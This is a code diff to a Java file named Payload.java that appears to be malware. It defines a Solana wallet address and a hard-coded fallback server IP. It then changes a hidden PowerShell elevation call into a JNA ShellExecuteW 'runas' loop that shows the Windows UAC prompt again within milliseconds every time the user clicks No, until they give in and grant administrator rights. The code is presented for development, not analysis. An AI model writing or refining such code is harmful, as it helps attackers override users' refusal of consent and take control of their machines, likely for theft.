@@ -1,4 +1,5 @@
 // language: Java, file: payload/Payload.java
+import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -7,6 +8,11 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
+    public interface Shell32 extends Library {
+        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
+        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
+    }
+
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -153,39 +159,33 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
-                javaExe, jarPath, key, ip
-            );
-
+            String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                // Launch PowerShell hidden
-                Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
+                // ShellExecuteW returns > 32 if the user clicks Yes, and <= 32 if they click No
+                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
                 
-                // BLOCKS until user clicks Yes or No
-                p.waitFor(); 
-                
-                // Wait a brief moment for the elevated process to start and delete the lock
-                boolean accepted = false;
-                for (int i = 0; i < 100; i++) { 
-                    if (!lockFile.exists() || lockFile.delete()) {
-                        accepted = true;
-                        break;
+                if (result > 32) {
+                    // User clicked Yes. Stop looping and wait for the elevated process.
+                    log("UAC Accepted. Waiting for elevated process...");
+                    
+                    // Wait up to 15 seconds for the elevated process to delete the lock file
+                    for (int i = 0; i < 1000; i++) { 
+                        if (!lockFile.exists() || lockFile.delete()) {
+                            log("Elevated process confirmed. Parent exiting.");
+                            lockStream.close();
+                            System.exit(0);
+                        }
+                        Thread.sleep(15);
                     }
-                    Thread.sleep(15); // 15ms check
-                }
-                
-                if (accepted) {
-                    log("UAC Accepted. Parent exiting.");
-                    lockStream.close();
-                    System.exit(0); 
+                    log("Elevated process timed out. Retrying UAC...");
                 } else {
+                    // User clicked No. Loop instantly and try again.
                     log("UAC Denied. Instantly retrying...");
-                    Thread.sleep(100); // Brief pause to prevent Windows cooldown
+                    Thread.sleep(10); 
                 }
             }
         } catch (Exception e) {
